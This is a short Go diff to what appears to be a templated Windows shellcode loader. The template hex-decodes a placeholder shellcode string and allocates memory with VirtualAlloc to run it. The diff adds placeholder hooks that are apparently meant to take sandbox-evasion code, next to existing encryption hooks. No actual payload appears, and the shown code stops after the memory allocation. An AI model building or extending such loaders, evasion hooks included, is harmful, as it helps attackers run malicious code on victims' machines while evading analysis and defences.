@@ -5,6 +5,7 @@ import (
 	"golang.org/x/sys/windows"
 	"unsafe"
 	//__ENCRYPTMODULE__
+	//__SANDBOXMODULE__
 )
 
 const (
@@ -15,6 +16,7 @@ const (
 )
 
 func main() {
+	//__SANDBOX__
 	shellcode, _ := hex.DecodeString("__SHELLCODE__")
 	//__ENCRYPTCODE__
 	address, _ := windows.VirtualAlloc(uintptr(0), uintptr(len(shellcode)), MemCommit|MemReserve, PageReadwrite)
